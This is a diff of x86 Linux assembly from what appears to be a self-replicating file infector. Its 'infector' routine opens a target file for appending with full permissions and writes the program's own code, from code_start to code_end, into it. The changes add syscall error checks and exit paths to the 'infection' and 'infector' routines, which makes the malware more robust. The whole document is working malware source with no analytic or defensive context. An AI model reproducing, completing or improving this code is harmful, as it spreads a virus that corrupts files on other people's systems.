@@ -55,6 +55,8 @@ infection:
     call    strlen
     add     esp, 4
 
+    ; print the message
+
     mov     edx, eax
     mov     eax, 4  
     mov     ebx, 1
@@ -62,9 +64,19 @@ infection:
 
     int     0x80
 
+    cmp     eax, 0
+    jle     infection_error    ; eax <= 0 (0 or -1)
+
     popad
     pop     ebp
     ret
+
+    infection_error:
+        popad
+        pop     ebp
+        mov     eax, 1
+        mov     ebx, 0x55
+        int 0x80
 
 
 infector:
@@ -85,6 +97,9 @@ infector:
     mov     ecx, [ebp + 8]  
     int     0x80
 
+    cmp     eax, 0
+    jle     infector_error
+
     ; open the file
 
     mov     eax, 5
@@ -92,6 +107,9 @@ infector:
     mov     ecx, 1025       ; write and append
     mov     edx, 511        ; all permissions
     int     0x80
+
+    cmp     eax, -1
+    je      infector_error
 
     mov     [ebp - 4], eax
 
@@ -104,15 +122,29 @@ infector:
     sub     edx, code_start
     int     0x80
 
+    cmp     eax, 0
+    jle     infector_error
+
     ; close the file
 
     mov     eax, 6
     mov     ebx, [ebp - 4]
     int     0x80
 
+    cmp     eax, -1
+    je      infector_error
+
     popad
     add     esp, 4
     pop     ebp
     ret
+
+    infector_error:
+        popad
+        add     esp, 4
+        pop     ebp
+        mov     eax, 1
+        mov     ebx, 0x55
+        int 0x80
 
 code_end:
